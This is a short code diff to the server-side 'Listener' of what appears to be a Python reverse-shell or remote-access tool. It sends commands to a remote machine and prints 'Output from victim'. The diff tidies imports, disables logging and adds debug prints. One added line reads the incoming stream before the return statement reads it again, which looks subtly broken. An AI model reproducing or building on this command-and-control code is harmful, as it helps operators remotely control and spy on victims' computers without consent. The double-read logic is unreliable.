@@ -1,8 +1,7 @@
-import socket, sys, json, argparse, subprocess, traceback, base64, logging, time, os
+import socket, sys, json, argparse, subprocess, traceback, base64, logging, time, os, multiprocessing, time
 from sys import getsizeof
 from itertools import cycle
-import multiprocessing, time
-logging.basicConfig(level=logging.DEBUG, format = '%(levelname)s - %(message)s')
+#logging.basicConfig(level=logging.DEBUG, format = '%(levelname)s - %(message)s')
 
 
 
@@ -194,6 +193,7 @@ class Listener:
         #result = result.decode()
         time.sleep(1)
         spinner.terminate()
+        print(self.recvStream())
         return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
@@ -250,8 +250,10 @@ class Listener:
                     
                     else:
                         print(f'{fc.purple}File name required.{fc.end}')
+                
 
                 else:
+                    print(cmd)
                     result = self.executeCmd(cmd)   
                     print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long') #using utf8len function to get the byte length of a string
                     print(f'{fc.purple}#{fc.end}'*100)
